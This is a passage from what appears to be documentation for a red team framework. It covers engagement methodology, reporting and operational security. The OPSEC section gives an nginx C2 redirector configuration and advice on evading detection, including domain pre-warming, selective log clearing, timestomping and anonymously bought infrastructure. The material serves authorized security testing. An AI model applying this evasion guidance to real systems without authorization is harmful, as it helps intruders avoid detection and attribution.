long-term C2 operations. Noisy default behavior.\n\n**Best For**: Vulnerability exploitation, initial access, lab environments, certification exams.\n\n## Vantablack (This Framework)\n\n**Key Features**:\n- Go agent with and reporting\n- Adversary emulation playbooks\n- Reputation pre-warming for infrastructure\n- DGA for resilient C2 resolution\n- Customizable evasion chains\n\n**Best For**: Custom engagements | Cobalt Strike, Brute Ratel |\n| Windows EDR evasion priority | Havoc, Brute Ratel, custom |\n| Cross-platform targets | Sliver, Mythic |\n| Large team / compliance | Mythic, Cobalt Strike |\n| Ops", "content": "# Red Team Engagement Methodology\n\nStructured methodology for planning, executing, and reporting red team engagements.\n\n## Phase 1: Scoping and Planning\n\n### Rules of Engagement (ROE)\n\nDefine before any activity begins:\n\n```\n- Scope: which systems, networks, users are in/out of scope\n- Crown jewels: primary objectives (domain admin, specific data, PCI systems)\n- Out-of-scope: critical systems, production databases, third-party infrastructure\n- Timing: engagement window, blackout periods, business hours restrictions\n- Methods: allowed techniques (social engineering, physical, network, application)\n- Notification: who knows about the engagement (CEO, CISO, legal, SOC lead)\n- Deconfliction: procedure when blue team detects activity\n- Emergency contacts: escalation path for unexpected situations\n- Data handling: how to handle sensitive data encountered during testing\n- Legal: authorization letters, signed contracts, get-out-of-jail letter\n```\n\n### Threat Intelligence Gathering\n\nResearch the target's:\n- Industry and regulatory environment\n- Known threat actors targeting the industry\n- Technology stack (job postings, LinkedIn, DNS, Shodan)\n- Security posture (published security certifications, breach history)\n- Organizational structure (key personnel, departments, locations)\n\n### Attack Planning\n\nBased on threat intel, develop attack paths:\n```\nPath A (Primary): Phishing → Foothold → AD Escalation → Crown Jewel\nPath B (Backup): Web App Exploitation → Internal Pivot → Data Access\nPath C (Physical): Social Engineering → Physical Access → Network Access\n```\n\n### Infrastructure Build-Out\n\n30+ days before engagement:\n1. Purchase and categorize domains\n2. Deploy VPS infrastructure (staging, C2, redirectors)\n3. Configure SSL certificates\n4. Build and test malleable C2 profiles\n5. Prepare payload arsenal (test against target's known EDR)\n6. Set up phishing infrastructure (mail servers, landing pages)\n7. Configure logging and evidence collection\n\n## Phase 2: Execution\n\n### Initial Access\n\n```\nWeeks 1-2: External reconnaissance and initial access attempts\n- Execute phishing campaigns\n- Test web application attack vectors\n- Attempt credential attacks (spraying, stuffing)\n- Try physical/social engineering if in scope\n```\n\n### Establish Foothold\n\n```\nImmediate priorities after first callback:\n1. Stabilize access (deploy persistent implant)\n2. Install redundant persistence (2-3 mechanisms)\n3. Establish backup C2 channels\n4. Begin internal reconnaissance\n```\n\n### Internal Reconnaissance\n\n```\n- Network mapping (ARP, ICMP, port scanning)\n- Active Directory enumeration (BloodHound)\n- Share enumeration (sensitive file discovery)\n- Service enumeration (databases, web apps, legacy systems)\n- Credential hunting (config files, memory, stored passwords)\n```\n\n### Privilege Escalation\n\n```\n- Local privesc (misconfigurations, unpatched vulnerabilities)\n- AD attack paths (Kerberoasting, DACL abuse, delegation)\n- Token impersonation\n- Credential extraction and reuse\n```\n\n### Lateral Movement\n\n```\n- Move toward crown jewel assets\n- Establish presence in multiple network segments\n- Maintain operational tempo (not too fast, not too slow)\n- Document each pivot for the attack narrative\n```\n\n### Objective Completion\n\n```\n- Access crown jewel assets as defined in ROE\n- Capture evidence (screenshots, data samples, access proof)\n- Document the complete attack chain\n- Do NOT exfiltrate real sensitive data unless specifically authorized\n```\n\n## Phase 3: Cleanup and Reporting\n\n### Cleanup Procedure\n\n```bash\n# For each compromised system:\n1. Remove persistence mechanisms (in reverse order of installation)\n2. Delete dropped files and tools\n3. Remove created accounts\n4. Restore modified configurations\n5. Verify cleanup (re-check system for artifacts)\n6. Document what was removed and what remains\n```\n\n### Evidence Collection\n\nMaintain throughout the engagement:\n- Screenshots of access to crown jewels\n- Command output logs (timestamped)\n- Network diagrams showing attack path\n- Credential material found (hashes, not plaintext)\n- Security misconfigurations identified\n\n### Report Structure\n\n```\n1. Executive Summary (1-2 pages)\n - Engagement overview\n - Key findings (business impact language)\n - Risk ratings\n - Top recommendations\n\n2. Technical Findings\n - Each finding includes:\n - Description\n - Impact and risk rating\n - Evidence (screenshots, logs)\n - MITRE ATT&CK mapping\n - Remediation recommendation\n - Detection opportunity\n\n3. Attack Narrative\n - Chronological story of the engagement\n - Decision points and reasoning\n - What worked and what didn't\n - Time spent on each phase\n\n4. ATT&CK Navigator Layer\n - Visual mapping of techniques used\n - Coverage gaps identified\n - Detection vs non-detection for each technique\n\n5. Remediation Roadmap\n - Prioritized recommendations\n - Quick wins vs long-term improvements\n - Architecture-level recommendations\n\n6. Appendices\n - Full tool list\n - IOC list for deconfliction\n - Raw evidence\n - Methodology reference\n```\n\n## Operator Roles\n\n| Role | Responsibility |\n|------|---------------|\n| Lead Operator | Overall execution, decision-making, client communication |\n| Support Operator | Technical execution, tooling, infrastructure management |\n| Report Writer | Evidence collection, finding documentation, final report |\n| Infrastructure Manager | C2 and redirector management, monitoring |\n\n## Communication Protocols\n\n- **Daily check-ins**: Status update between operators\n- **Weekly client updates**: High-level progress (if agreed in ROE)\n- **Abort signal**: Predefined procedure to halt all activity immediately\n- **Deconfliction**: Contact procedure when blue team escalates an incident\n- **Evidence handling**: Encrypted storage, access controls, deletion timeline\n\n## Purple Team Integration Points\n\nIf operating as purple team:\n- Pre-brief detection team on technique categories (not specifics)\n- Execute technique → allow detection time → review detection capability\n- Document detection gaps and successes\n- Collaborate on detection rule development\n- Iterate: improve detection → re-test with modified technique\n\n## ATT&CK Mapping\n\nMap every action to MITRE ATT&CK throughout the engagement:\n\n```\nT1566.001 - Phishing: Spearphishing Attachment\nT1059.001 - Command and Scripting Interpreter: PowerShell\nT1053.005 - Scheduled Task/Job: Scheduled Task\nT1078.002 - Valid Accounts: Domain Accounts\nT1003.001 - OS Credential Dumping: LSASS Memory\nT1021.002 - Remote Services: SMB/Windows Admin Shares\n```\n\nUse ATT&CK Navigator to generate visual heatmaps of technique coverage.\n\n## OpSec Notes\n\n- Maintain detailed logs for every action — critical for deconfliction and reporting\n- Never exceed the scope defined in the ROE\n- If you discover real threat actor activity, stop and notify the client immediately\n- Handle sensitive data according to contractual obligations\n- Ensure all infrastructure is decommissioned after engagement completion\n- Retain evidence per contractual retention period, then securely destroy", "last_updated": "2026-03-12"}, "opsec": {"slug": "opsec", "title": "Operational Security for Red Teams", "category": "Red Team Ops", "content": "# Operational Security for Red Teams\n\nOPSEC principles and practices for conducting red team engagements without premature detection or attribution.\n\n## Infrastructure Separation\n\nCategorize infrastructure by function and never reuse across categories:\n\n| Layer | Purpose | Examples |\n|-------|---------|---------|\n| Staging | Initial payload hosting, phishing landing | Short-lived VPS, S3 buckets |\n| Short-haul | First-stage C2, initial callback | Redirectors with 7-day rotation |\n| Long-haul | Persistent C2, primary implant management | Aged domains, CDN-fronted |\n| Phishing | Email delivery, credential harvesting | Dedicated mail servers, SendGrid |\n| Redirectors | Traffic filtering, blue team deflection | Nginx/Apache/Cloudflare Workers |\n\nEach layer uses separate VPSes, domains, and certificates. Compromise of one layer does not expose others.\n\n## Redirector Chains\n\n```\nImplant → CDN (Cloudflare) → Redirector 1 (nginx) → Redirector 2 (socat) → C2 Server\n```\n\nRedirector configuration (nginx):\n```nginx\nserver {\n listen 443 ssl;\n ssl_certificate /etc/letsencrypt/live/redirect.com/fullchain.pem;\n ssl_certificate_key /etc/letsencrypt/live/redirect.com/privkey.pem;\n\n # Only allow expected C2 traffic patterns\n location /api/v1/ {\n # Validate User-Agent, headers, etc.\n if ($http_user_agent !~* \"Mozilla/5.0\") {\n return 404;\n }\n proxy_pass https://c2-server:443;\n proxy_ssl_verify off;\n }\n\n # Default: return legitimate-looking content\n location / {\n return 302 https://www.microsoft.com;\n }\n}\n```\n\n## Domain Management\n\n- **Purchase 30+ days before engagement** — fresh domains are flagged\n- **Categorize via reputation services**: Submit to Cloudflare, Bluecoat/Symantec, McAfee, Palo Alto URL categorization\n- **Match target industry**: Use domains that look like industry-relevant services (HR platform, cloud service, collaboration tool)\n- **SSL certificates immediately**: Let's Encrypt — certificate age is checked by some security products\n- **Realistic WHOIS**: Use privacy protection or realistic registrant info\n\n## Malleable C2 Profiles\n\nConfigure traffic to match legitimate applications used by the target:\n\n```\n# Research phase: identify which cloud services the target uses\n# (DNS records, Office 365, Slack, Salesforce, etc.)\n# Build malleable profile mimicking that specific traffic pattern\n\n# Key elements to match:\n# - URI patterns\n# - HTTP headers (User-Agent, Accept, Content-Type)\n# - Request/response sizes\n# - TLS fingerprint (JA3)\n# - Cookie behavior\n# - Timing patterns\n```\n\n## Operational Timeline\n\n- **Activity hours**: Match target organization's business hours and timezone\n- **Holiday awareness**: Reduced staffing = higher detection risk (anomalous after-hours activity)\n- **Phased approach**: Reconnaissance → Initial Access → Establish Foothold → Internal Recon → Escalation → Objectives\n- **No rushing**: Allow time between phases for defender response assessment\n\n## Agent OpSec\n\n- Delete dropped artifacts immediately after use\n- Clear event logs selectively (clearing all logs is more suspicious than clearing none)\n- Timestomp files to match surrounding directory (match creation/modification times)\n- Avoid noisy modules in production — test in lab environment first\n- Prefer in-memory operations over disk writes\n- Use sleep obfuscation with memory encryption during idle periods\n- Implement execution guardrails (only run in target environment)\n\n## Attribution Avoidance\n\n- **Dedicated VMs per engagement**: No cross-contamination between clients\n- **No personal accounts**: Separate browsers, VPN accounts, email for infra management\n- **Anonymous infrastructure purchasing**: Cryptocurrency or prepaid cards for VPS/domains\n- **VPN/Tor for infra management**: Never access C2 infrastructure from personal IP\n- **Unique signatures per engagement**: Don't reuse implant signatures, user agents, or C2 profiles across clients\n- **Watermarking**: Include unique identifiers per client/engagement for post-incident deconfliction\n\n## Kill Switch and Cleanup\n\nPlan cleanup procedures before engagement begins:\n\n```\nCleanup checklist:\n[ ] Remove all persistence mechanisms\n[ ] Delete staged/dropped files\n[ ] Remove created user accounts\n[ ] Restore modified registry keys\n[ ] Remove scheduled tasks\n[ ] Delete created services\n[ ] Clear relevant event log entries\n[ ] Remove firewall rule modifications\n[ ] Delete shadow copies created\n[ ] Remove GPO modifications\n[ ] Document all changes for client report\n```\n\nImplement a kill switch: ability to remotely instruct all implants to self-destruct, remove persistence, and exit cleanly.\n\n## Counter Threat Intelligence\n\n- Never reuse C2 infrastructure across engagements\n- Rotate implant build artifacts (compile timestamps, PE metadata, strings)\n- Monitor threat intel feeds for your own infrastructure (VirusTotal, URLScan, Shodan)\n- Use unique code signing certificates per engagement\n- Avoid public scanning (Shodan, Censys) of C2 infrastructure\n- Check domain reputation before use (VirusTotal, URLVoid, Cisco Talos)\n\n## Logging and Deconfliction\n\nMaintain detailed operator logs:\n\n```\nTimestamp | Operator | Action | Source IP | Target | Result | Notes\n2024-01-15 09:30 | op1 | phish_send | 203.0.113.5 | user@target.com | delivered | campaign_id:001\n2024-01-15 10:15 | op1 | callback | 203.0.113.5 | 10.0.0.50 | foothold | beacon_id:abc123\n```\n\nDeconfliction ensures red team activity can be distinguished from real threat actor activity. Include:\n- All IPs used\n- All domains used\n- All user accounts created\n- All files dropped\n- Timestamps of all activity\n\n## Peer Review\n\nBefore executing any phase:\n- Second operator reviews attack plan\n- Validate tool configurations in lab\n- Confirm scope boundaries and ROE\n- Verify emergency contact procedures\n- Test cleanup procedures\n\n## OpSec Failures to Avoid\n\n| Mistake | Consequence |\n|---------|------------|\n| Reusing infrastructure | Cross-client attribution |\n| Scanning from C2 IP | C2 server discovered via Shodan |\n| Default User-Agent strings | Immediate signature match |\n| Aggressive scanning | IDS/IPS alerts, IP blocks |\n| Dropping known tools to disk | AV detection, burned operation |\n| Clearing all event logs | More suspicious than the attack itself |\n| Testing payloads on VirusTotal | Sample shared with all AV vendors |\n| Using personal VPN | Attribution to operator |", "last_updated": "2026-03-12"}, "attck-mapping": {"slug": "attck-mapping", "title": "ATT&CK Mapping and Reporting", "category": "Reporting", "content": "# ATT&CK Mapping and Reporting\n\nMITRE ATT&CK is the authoritative adversary behavior knowledge base — cataloging tactics, techniques, and procedures observed from real threat actors.
